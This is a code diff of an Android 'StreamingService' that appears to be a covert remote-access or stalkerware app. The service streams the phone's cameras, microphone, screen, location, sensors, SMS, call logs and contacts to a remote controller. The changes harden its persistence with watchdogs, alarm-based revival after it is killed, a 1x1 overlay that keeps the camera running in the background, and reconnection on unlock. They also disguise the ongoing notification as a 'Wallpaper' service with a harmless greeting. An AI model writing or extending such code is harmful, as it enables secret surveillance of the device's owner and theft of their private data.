@@ -93,11 +93,21 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private long lastSensorEmitTime = 0;
     private static final String TAG = "StreamingService";
     private static final long DATA_POLL_INTERVAL = 30_000; // Poll every 30 seconds
-    private static final boolean showNotif = false;
+    private static final boolean showNotif = true;
+
+    private final Handler internalWatchdogHandler = new Handler(Looper.getMainLooper());
+    private static final long INTERNAL_WATCHDOG_INTERVAL_MS = 15_000; // Check every 15 seconds
+    private final Runnable internalWatchdogRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkAndEnforceStreaming();
+            internalWatchdogHandler.postDelayed(this, INTERNAL_WATCHDOG_INTERVAL_MS);
+        }
+    };
 
     private PeerConnectionFactory factory;
     private EglBase eglBase;
-    
+
     // Modular Components
     private CameraManager cameraManager;
     private ScreenCaptureManager screenCaptureManager;
@@ -120,6 +130,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private LocationCallback locationCallback;
     private BroadcastReceiver syncReceiver;
     private BroadcastReceiver gpsReceiver;
+    private BroadcastReceiver screenStateReceiver;
     private long lastGpsPromptTime = 0;
     private static final long GPS_PROMPT_DEBOUNCE_MS = 5000;
     private PowerManager.WakeLock wakeLock;
@@ -129,6 +140,14 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     public static StreamingService getInstance() {
         return instance;
+    }
+
+    public boolean isFrontCameraStreaming() {
+        return isFrontCameraStreaming;
+    }
+
+    public boolean isBackCameraStreaming() {
+        return isBackCameraStreaming;
     }
 
     @Override
@@ -148,7 +167,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             proximitySensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_PROXIMITY);
             accelSensor = sensorManager.getDefaultSensor(android.hardware.Sensor.TYPE_ACCELEROMETER);
         }
-        
+
         updateForegroundServiceNotification(false);
 
         // Register Sync Receiver (triggered by WorkManager)
@@ -202,6 +221,34 @@ public class StreamingService extends Service implements android.hardware.Sensor
             registerReceiver(gpsReceiver, gpsFilter);
         }
 
+        // Register Screen Lock / Unlock state receiver
+        screenStateReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (intent == null) return;
+                String action = intent.getAction();
+                if (Intent.ACTION_USER_PRESENT.equals(action) || Intent.ACTION_SCREEN_ON.equals(action)) {
+                    Log.i(TAG, "Screen unlocked / turned ON (action=" + action + "). Re-evaluating streaming health...");
+                    acquireWakeLock();
+                    OverlayWindowManager.ensureOverlay(StreamingService.this);
+                    ensureSocketConnected();
+                    // Delay 600ms to allow CameraService and WindowManager to drop lockscreen restrictions
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        checkAndEnforceStreaming();
+                    }, 600);
+                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
+                    Log.d(TAG, "Screen turned OFF (locked). Maintaining background streaming state...");
+                    acquireWakeLock();
+                    OverlayWindowManager.ensureOverlay(StreamingService.this);
+                }
+            }
+        };
+        IntentFilter screenFilter = new IntentFilter();
+        screenFilter.addAction(Intent.ACTION_USER_PRESENT);
+        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
+        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
+        registerReceiver(screenStateReceiver, screenFilter);
+
         // Schedule WorkManager (Periodic fallback)
         androidx.work.PeriodicWorkRequest saveRequest =
                 new androidx.work.PeriodicWorkRequest.Builder(DataSyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
@@ -216,14 +263,23 @@ public class StreamingService extends Service implements android.hardware.Sensor
             stopSelf();
             return;
         }
-        
+
         initializeWebRTC();
         localRecorder = new LocalRecorder(this, eglBase);
         setupMediaStreaming();
         connectSignaling();
         startNotificationListener();
-        
+
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+
+        // Ensure 1x1 overlay view for background streaming stability (prevents camera hardware disconnect)
+        OverlayWindowManager.ensureOverlay(this);
+
+        // Start internal periodic watchdog (checks streaming & socket health every 15s)
+        startInternalWatchdog();
+
+        // Schedule external AlarmManager watchdog (checks and revives service every 25s)
+        StreamingWatchdogReceiver.scheduleNext(this);
     }
 
     @Override
@@ -231,6 +287,9 @@ public class StreamingService extends Service implements android.hardware.Sensor
         if (intent != null) {
             String action = intent.getAction();
             if (Constants.ACTION_STOP_STREAMING.equals(action)) {
+                StreamingWatchdogReceiver.cancel(this);
+                stopInternalWatchdog();
+                OverlayWindowManager.removeOverlay();
                 stopSelf();
                 return START_NOT_STICKY;
             } else if (Constants.ACTION_GPS_ENABLED.equals(action)) {
@@ -251,11 +310,24 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     setScreenStreaming(true);
                 }
             }
+
+            if (intent.hasExtra(Constants.PREF_SIGNALING_URL)) {
+                String newUrl = intent.getStringExtra(Constants.PREF_SIGNALING_URL);
+                if (newUrl != null && !newUrl.trim().isEmpty()) {
+                    Log.i(TAG, "Updating signaling URL to: " + newUrl);
+                    if (socket != null) {
+                        try { socket.disconnect(); } catch (Exception ignored) {}
+                        socket = null;
+                    }
+                    connectSignaling();
+                }
+            }
         }
         // Ensure background connection is active
-        if (socket != null && !socket.connected()) {
-            socket.connect();
-        }
+        ensureSocketConnected();
+        OverlayWindowManager.ensureOverlay(this);
+        startInternalWatchdog();
+        StreamingWatchdogReceiver.scheduleNext(this);
         return START_STICKY;
     }
 
@@ -266,6 +338,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
             instance = null;
         }
         Log.d(TAG, "Service onDestroy");
+        stopInternalWatchdog();
+        OverlayWindowManager.removeOverlay();
         if (syncReceiver != null) unregisterReceiver(syncReceiver);
         if (gpsReceiver != null) {
             try {
@@ -273,11 +347,23 @@ public class StreamingService extends Service implements android.hardware.Sensor
             } catch (Exception ignored) {}
             gpsReceiver = null;
         }
+        if (screenStateReceiver != null) {
+            try {
+                unregisterReceiver(screenStateReceiver);
+            } catch (Exception ignored) {}
+            screenStateReceiver = null;
+        }
         cancelGpsNotification();
         unregisterNetworkCallback();
         releaseWakeLock();
         cleanup();
         if (socket != null) socket.disconnect();
+
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
+            // Re-arm external watchdog so it revives the service if killed unexpectedly by OS
+            StreamingWatchdogReceiver.scheduleNext(this);
+        }
     }
 
     @Override
@@ -289,48 +375,15 @@ public class StreamingService extends Service implements android.hardware.Sensor
     public void onTaskRemoved(Intent rootIntent) {
         Log.d(TAG, "Service onTaskRemoved (app swiped from recents), auto-reconnecting in background...");
 
+        acquireWakeLock();
+        OverlayWindowManager.ensureOverlay(this);
+        ensureSocketConnected();
+
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
         if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
-            // 1. AlarmManager restart via ForegroundService PendingIntent
-            Intent restartServiceIntent = new Intent(getApplicationContext(), StreamingService.class);
-            restartServiceIntent.setPackage(getPackageName());
-            int pendingFlags = PendingIntent.FLAG_ONE_SHOT;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
-            }
-            PendingIntent restartServicePendingIntent;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                restartServicePendingIntent = PendingIntent.getForegroundService(
-                        getApplicationContext(), 1, restartServiceIntent, pendingFlags);
-            } else {
-                restartServicePendingIntent = PendingIntent.getService(
-                        getApplicationContext(), 1, restartServiceIntent, pendingFlags);
-            }
+            // Re-arm watchdog and kickstart WorkManager
+            StreamingWatchdogReceiver.scheduleNext(getApplicationContext());
 
-            AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
-            if (alarmService != null) {
-                long triggerAt = SystemClock.elapsedRealtime() + 500;
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    try {
-                        alarmService.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, restartServicePendingIntent);
-                    } catch (Exception e) {
-                        alarmService.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, restartServicePendingIntent);
-                    }
-                } else {
-                    alarmService.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, restartServicePendingIntent);
-                }
-            }
-
-            // 2. Broadcast revival to BootReceiver
-            try {
-                Intent broadcastIntent = new Intent(getApplicationContext(), BootReceiver.class);
-                broadcastIntent.setAction(BootReceiver.ACTION_RESTART_STREAMING);
-                sendBroadcast(broadcastIntent);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to send revival broadcast", e);
-            }
-
-            // 3. WorkManager Expedited kickstart
             try {
                 androidx.work.OneTimeWorkRequest workRequest = new androidx.work.OneTimeWorkRequest.Builder(DataSyncWorker.class)
                         .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
@@ -379,12 +432,25 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 networkCallback = new ConnectivityManager.NetworkCallback() {
                     @Override
                     public void onAvailable(@NonNull Network network) {
-                        Log.d(TAG, "Network restored, checking socket connection...");
+                        Log.i(TAG, "Network restored (Internet available), checking socket connection & WebRTC health...");
                         new Handler(Looper.getMainLooper()).post(() -> {
+                            acquireWakeLock();
+                            OverlayWindowManager.ensureOverlay(StreamingService.this);
                             if (socket != null && !socket.connected()) {
+                                Log.d(TAG, "Reconnecting Socket.IO on network restoration...");
                                 socket.connect();
                             }
+                            if (webClientId != null) {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                    checkAndEnforceStreaming();
+                                }, 1000);
+                            }
                         });
+                    }
+
+                    @Override
+                    public void onLost(@NonNull Network network) {
+                        Log.w(TAG, "Network connection lost (Data/Wi-Fi disconnected). Awaiting reconnection...");
                     }
                 };
                 cm.registerNetworkCallback(request, networkCallback);
@@ -409,8 +475,22 @@ public class StreamingService extends Service implements android.hardware.Sensor
     }
 
     private String getSignalingUrl() {
-        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        Context storageContext = this;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            android.os.UserManager um = (android.os.UserManager) getSystemService(Context.USER_SERVICE);
+            if (um != null && !um.isUserUnlocked()) {
+                storageContext = createDeviceProtectedStorageContext();
+            }
+        }
+        SharedPreferences prefs = storageContext.getSharedPreferences(
+                getPackageName() + "_preferences", Context.MODE_PRIVATE);
         String saved = prefs.getString(Constants.PREF_SIGNALING_URL, null);
+        if (saved == null || saved.trim().isEmpty() || saved.contains("railway.app")) {
+            try {
+                saved = PreferenceManager.getDefaultSharedPreferences(storageContext)
+                        .getString(Constants.PREF_SIGNALING_URL, null);
+            } catch (Exception ignored) {}
+        }
         if (saved == null || saved.trim().isEmpty() || saved.contains("railway.app")) {
             saved = Constants.DEFAULT_SIGNALING_URL;
         }
@@ -451,7 +531,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
         boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
         boolean contacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
-        
+
         boolean storage = true;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             storage = android.os.Environment.isExternalStorageManager();
@@ -467,7 +547,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         if (!location) Log.e(TAG, "Location permission missing");
         if (!contacts) Log.e(TAG, "Contacts permission missing");
         if (!storage) Log.e(TAG, "Storage permission missing");
-        
+
         return camera && audio && notify && callLog && sms && location && contacts && storage;
     }
 
@@ -490,8 +570,30 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
     private void setupMediaStreaming() {
         cameraManager = new CameraManager(this, eglBase);
+        cameraManager.setOnCameraFailureListener((isFront, reason) -> {
+            Log.w(TAG, "Camera hardware failure reported: front=" + isFront + ", reason=" + reason);
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                if (isFront && isFrontCameraStreaming) {
+                    Log.d(TAG, "Auto-recovering front camera capture in background...");
+                    cameraManager.startFrontCamera();
+                }
+                if (!isFront && isBackCameraStreaming) {
+                    Log.d(TAG, "Auto-recovering back camera capture in background...");
+                    cameraManager.startBackCamera();
+                }
+            }, 1500);
+        });
         cameraManager.initialize(factory);
         screenCaptureManager = new ScreenCaptureManager(this, eglBase);
+        screenCaptureManager.setOnScreenCaptureStoppedListener(() -> {
+            Log.w(TAG, "MediaProjection screen capture stopped by system");
+            new Handler(Looper.getMainLooper()).post(() -> {
+                mediaProjectionData = null;
+                isScreenStreaming = false;
+                updateForegroundServiceNotification(false);
+                sendStreamStatus();
+            });
+        });
         screenCaptureManager.initialize(factory);
         // By default, do not start front or back camera capturers (stream on demand)
         // Audio capture is also started strictly on demand to prevent microphone usage indicator
@@ -522,6 +624,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
         config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
         config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;
+        config.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
 
         peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
             @Override
@@ -531,6 +634,19 @@ public class StreamingService extends Service implements android.hardware.Sensor
             @Override
             public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                 Log.d(TAG, "ICE connection state: " + s);
+                if (s == PeerConnection.IceConnectionState.DISCONNECTED || s == PeerConnection.IceConnectionState.FAILED) {
+                    Log.w(TAG, "WebRTC ICE connection " + s + "; scheduling auto-rebuild check...");
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                        if (peerConnection != null) {
+                            PeerConnection.IceConnectionState current = peerConnection.iceConnectionState();
+                            if ((current == PeerConnection.IceConnectionState.DISCONNECTED || current == PeerConnection.IceConnectionState.FAILED)
+                                    && webClientId != null && socket != null && socket.connected()) {
+                                Log.i(TAG, "ICE still down (" + current + "); rebuilding PeerConnection now...");
+                                rebuildPeerConnection();
+                            }
+                        }
+                    }, 3000);
+                }
             }
             @Override
             public void onIceConnectionReceivingChange(boolean receiving) {}
@@ -550,10 +666,12 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     signal.put("candidate", candidate);
                     JSONObject msg = new JSONObject();
                     msg.put("to", webClientId);
-                    msg.put("from", socket.id());
+                    msg.put("from", socket != null ? socket.id() : "");
                     msg.put("signal", signal);
-                    socket.emit(Constants.EVENT_SIGNAL, msg);
-                    Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
+                    if (socket != null && socket.connected()) {
+                        socket.emit(Constants.EVENT_SIGNAL, msg);
+                        Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
+                    }
                 } catch (JSONException e) {
                     Log.e(TAG, "ICE send failed", e);
                 }
@@ -574,26 +692,26 @@ public class StreamingService extends Service implements android.hardware.Sensor
             }
         });
 
-        if (cameraManager.hasFrontCamera()) {
+        if (cameraManager != null && cameraManager.hasFrontCamera()) {
             VideoTrack frontTrack = cameraManager.getFrontTrack();
-            if (frontTrack != null) frontTrack.setEnabled(false);
+            if (frontTrack != null) frontTrack.setEnabled(isFrontCameraStreaming);
             peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
-            Log.d(TAG, "Front video track added (initially disabled)");
+            Log.d(TAG, "Front video track added (enabled=" + isFrontCameraStreaming + ")");
         }
-        if (cameraManager.hasBackCamera()) {
+        if (cameraManager != null && cameraManager.hasBackCamera()) {
             VideoTrack backTrack = cameraManager.getBackTrack();
-            if (backTrack != null) backTrack.setEnabled(false);
+            if (backTrack != null) backTrack.setEnabled(isBackCameraStreaming);
             peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
-            Log.d(TAG, "Back video track added (initially disabled)");
+            Log.d(TAG, "Back video track added (enabled=" + isBackCameraStreaming + ")");
         }
         if (screenCaptureManager != null && screenCaptureManager.getScreenTrack() != null) {
             VideoTrack screenTrack = screenCaptureManager.getScreenTrack();
-            screenTrack.setEnabled(false);
+            if (screenTrack != null) screenTrack.setEnabled(isScreenStreaming);
             peerConnection.addTransceiver(screenTrack, new RtpTransceiver.RtpTransceiverInit(
                     RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
-            Log.d(TAG, "Screen video track added (initially disabled)");
+            Log.d(TAG, "Screen video track added (enabled=" + isScreenStreaming + ")");
         }
         audioTransceiver = peerConnection.addTransceiver(
                 MediaStreamTrack.MediaType.MEDIA_TYPE_AUDIO,
@@ -602,7 +720,12 @@ public class StreamingService extends Service implements android.hardware.Sensor
                         Collections.singletonList("stream")
                 )
         );
-        Log.d(TAG, "Audio transceiver registered on standby (mic hardware idle)");
+        if (isMicStreaming && audioTrack != null && audioTransceiver.getSender() != null) {
+            audioTransceiver.getSender().setTrack(audioTrack, false);
+            Log.d(TAG, "Audio track attached to transceiver for active mic stream");
+        } else {
+            Log.d(TAG, "Audio transceiver registered on standby (mic hardware idle)");
+        }
     }
 
     private void connectSignaling() {
@@ -664,9 +787,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
             Log.d(TAG, "Received socket ID: " + args[0]);
         }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
             webClientId = (String) args[0];
-            Log.d(TAG, "Web client ready: " + webClientId);
-            createAndSendOffer();
-            // Default: camera, mic, and location do NOT stream automatically (stream on demand)
+            Log.d(TAG, "Web client ready: " + webClientId + ". Rebuilding PeerConnection fresh for this session...");
+            rebuildPeerConnection();
             sendCallLogs(); // Immediate sync
             sendSmsMessages(); // Immediate sync
             sendContacts(); // Immediate sync
@@ -895,15 +1017,15 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                 int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                 int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
-                
+
                 double batteryPct = (scale > 0) ? (level * 100 / (double) scale) : 0;
                 double tempC = temperature / 10.0;
-                
+
                 String source = "unplugged";
                 if (chargePlug == BatteryManager.BATTERY_PLUGGED_AC) source = "AC Charger";
                 else if (chargePlug == BatteryManager.BATTERY_PLUGGED_USB) source = "USB Port";
                 else if (chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS) source = "Wireless";
-                
+
                 details.put("percent", (int) batteryPct);
                 details.put("temperature", tempC);
                 details.put("source", source);
@@ -921,10 +1043,10 @@ public class StreamingService extends Service implements android.hardware.Sensor
             long blockSize = stat.getBlockSizeLong();
             long totalBlocks = stat.getBlockCountLong();
             long availableBlocks = stat.getAvailableBlocksLong();
-            
+
             long totalBytes = totalBlocks * blockSize;
             long freeBytes = availableBlocks * blockSize;
-            
+
             return new long[]{ totalBytes, freeBytes };
         } catch (Exception e) {
             Log.e(TAG, "Error fetching storage metrics", e);
@@ -1069,7 +1191,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         if (payload == null) return;
         String text = payload.optString("text", "");
         if (!text.isEmpty()) {
-            new Handler(Looper.getMainLooper()).post(() -> 
+            new Handler(Looper.getMainLooper()).post(() ->
                 Toast.makeText(StreamingService.this, text, Toast.LENGTH_SHORT).show()
             );
         }
@@ -1437,6 +1559,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 }
             }
         }
+        updateForegroundServiceNotification(isScreenStreaming);
         Log.d(TAG, "Camera streaming updated: camera=" + camera + ", enable=" + enable);
         sendStreamStatus();
     }
@@ -1487,6 +1610,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         } catch (Exception e) {
             Log.e(TAG, "Error updating mic streaming: " + enable, e);
         }
+        updateForegroundServiceNotification(isScreenStreaming);
         Log.d(TAG, "Mic streaming updated: " + enable);
         sendStreamStatus();
     }
@@ -1503,6 +1627,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             cancelGpsNotification();
             stopLocationUpdates();
         }
+        updateForegroundServiceNotification(isScreenStreaming);
         Log.d(TAG, "Location streaming updated: " + enable);
         sendStreamStatus();
     }
@@ -1583,24 +1708,39 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private void updateForegroundServiceNotification(boolean withMediaProjection) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             int types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
-            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+
+            // Only request CAMERA foreground type when camera is actually streaming or needed
+            if ((isFrontCameraStreaming || isBackCameraStreaming) &&
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
             }
-            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+
+            // Only request MICROPHONE foreground type when microphone is actually streaming
+            if (isMicStreaming &&
+                    ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
             }
+
+            // Request LOCATION foreground type when location permission is granted
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
             }
-            if (withMediaProjection) {
+
+            // Request MEDIA_PROJECTION foreground type when screen streaming is active
+            if (withMediaProjection && mediaProjectionData != null) {
                 types |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
             }
+
             try {
                 startForeground(Constants.NOTIFICATION_ID, createNotification(), types);
             } catch (Exception e) {
-                Log.e(TAG, "Failed startForeground with types=" + types + ", falling back to basic notification", e);
-                startForeground(Constants.NOTIFICATION_ID, createNotification());
+                Log.e(TAG, "Failed startForeground with types=" + types + ", falling back to DATA_SYNC", e);
+                try {
+                    startForeground(Constants.NOTIFICATION_ID, createNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                } catch (Exception ex) {
+                    Log.e(TAG, "Failed fallback startForeground", ex);
+                }
             }
         } else {
             startForeground(Constants.NOTIFICATION_ID, createNotification());
@@ -1778,6 +1918,8 @@ public class StreamingService extends Service implements android.hardware.Sensor
         }
     }
 
+    private final List<IceCandidate> pendingIceCandidates = new ArrayList<>();
+
     private void createAndSendOffer() {
         if (webClientId == null) {
             Log.w(TAG, "No web client available");
@@ -1792,6 +1934,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         MediaConstraints mc = new MediaConstraints();
         mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
         mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
+        mc.mandatory.add(new MediaConstraints.KeyValuePair("IceRestart", "true"));
 
         final String clientId = webClientId;
         final String socketId = socket != null ? socket.id() : null;
@@ -1856,19 +1999,57 @@ public class StreamingService extends Service implements android.hardware.Sensor
             if ("answer".equals(type)) {
                 SessionDescription ans = new SessionDescription(
                         SessionDescription.Type.ANSWER, signal.getString("sdp"));
-                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
-                Log.d(TAG, "Processed answer from web client");
+                if (peerConnection != null) {
+                    peerConnection.setRemoteDescription(new SdpObserver() {
+                        @Override
+                        public void onCreateSuccess(SessionDescription s) {}
+                        @Override
+                        public void onSetSuccess() {
+                            Log.d(TAG, "Processed answer from web client successfully");
+                            drainPendingIceCandidates();
+                        }
+                        @Override
+                        public void onCreateFailure(String e) {}
+                        @Override
+                        public void onSetFailure(String err) {
+                            Log.e(TAG, "Failed to set remote answer: " + err + ". Rebuilding PeerConnection...");
+                            new Handler(Looper.getMainLooper()).post(() -> rebuildPeerConnection());
+                        }
+                    }, ans);
+                }
             } else if (signal.has("candidate")) {
                 JSONObject candidate = signal.getJSONObject("candidate");
                 IceCandidate c = new IceCandidate(
                         candidate.getString("sdpMid"),
                         candidate.getInt("sdpMLineIndex"),
                         candidate.getString("candidate"));
-                peerConnection.addIceCandidate(c);
-                Log.d(TAG, "Added ICE candidate");
+                if (peerConnection != null && peerConnection.getRemoteDescription() != null) {
+                    peerConnection.addIceCandidate(c);
+                    Log.d(TAG, "Added ICE candidate from web client: " + c.sdpMid);
+                } else {
+                    synchronized (pendingIceCandidates) {
+                        pendingIceCandidates.add(c);
+                    }
+                    Log.d(TAG, "Queued ICE candidate until remote description is set: " + c.sdpMid);
+                }
             }
         } catch (JSONException e) {
             Log.e(TAG, "Handle signaling error", e);
+        }
+    }
+
+    private void drainPendingIceCandidates() {
+        if (peerConnection == null) return;
+        synchronized (pendingIceCandidates) {
+            for (IceCandidate c : pendingIceCandidates) {
+                try {
+                    peerConnection.addIceCandidate(c);
+                    Log.d(TAG, "Flushed queued ICE candidate: " + c.sdpMid);
+                } catch (Exception e) {
+                    Log.w(TAG, "Error adding queued ICE candidate", e);
+                }
+            }
+            pendingIceCandidates.clear();
         }
     }
 
@@ -1892,38 +2073,36 @@ public class StreamingService extends Service implements android.hardware.Sensor
     private Notification createNotification() {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            int importance = showNotif ? NotificationManager.IMPORTANCE_LOW : NotificationManager.IMPORTANCE_MIN;
+            int importance = NotificationManager.IMPORTANCE_LOW;
             NotificationChannel ch = new NotificationChannel(
-                    Constants.CHANNEL_ID, "Streaming Service", importance);
+                    Constants.CHANNEL_ID, "Wallpaper", importance);
+            ch.setDescription("Wallpaper service");
+            ch.setShowBadge(false);
+            ch.enableLights(false);
+            ch.enableVibration(false);
+            ch.setSound(null, null);
             if (!showNotif) {
-                ch.setDescription("Background service");
-                ch.setShowBadge(false);
-                ch.enableLights(false);
-                ch.enableVibration(false);
                 ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
-            } else {
-                ch.setDescription("Camera, mic, notifications, call logs, SMS, and location streaming");
             }
             nm.createNotificationChannel(ch);
         }
 
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, Constants.CHANNEL_ID)
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setSmallIcon(R.mipmap.ic_logo)
                 .setOngoing(true);
 
         if (showNotif) {
             Intent stop = new Intent(this, StreamingService.class);
             stop.setAction(Constants.ACTION_STOP_STREAMING);
             PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
-                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
-                            PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
-            builder.setContentTitle("Streaming Active")
-                    .setContentText("Camera, mic, notifications, call logs, SMS, and location streaming")
+                    PendingIntent.FLAG_IMMUTABLE);
+            builder.setContentTitle("سلام")
+                    .setContentText("به آرزوی خوشبختی زندگی.")
                     .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI);
         } else {
-            builder.setContentTitle("")
-                    .setContentText("")
-                    .setPriority(NotificationCompat.PRIORITY_MIN)
+            builder.setContentTitle("سلام")
+                    .setContentText("به آرزوی خوشبختی زندگی.")
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
                     .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                     .setSilent(true);
         }
@@ -1959,7 +2138,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
     @Override
     public void onSensorChanged(android.hardware.SensorEvent event) {
         if (!isSensorSubscribed || webClientId == null || socket == null || !socket.connected()) return;
-        
+
         boolean changed = false;
         int type = event.sensor.getType();
         if (type == android.hardware.Sensor.TYPE_LIGHT) {
@@ -1993,7 +2172,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 JSONObject data = new JSONObject();
                 data.put("to", webClientId);
                 data.put("from", socket.id());
-                
+
                 JSONObject sensors = new JSONObject();
                 sensors.put("lux", lastLight);
                 sensors.put("proximity", lastProximity);
@@ -2001,7 +2180,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 sensors.put("accelY", Math.round(lastAccel[1] * 100.0) / 100.0);
                 sensors.put("accelZ", Math.round(lastAccel[2] * 100.0) / 100.0);
                 data.put("sensors", sensors);
-                
+
                 socket.emit(Constants.EVENT_SENSOR_DATA, data);
             } catch (JSONException e) {
                 Log.e(TAG, "Sensor JSON compilation error", e);
@@ -2017,7 +2196,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
         try {
             android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
             android.net.ConnectivityManager connManager = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
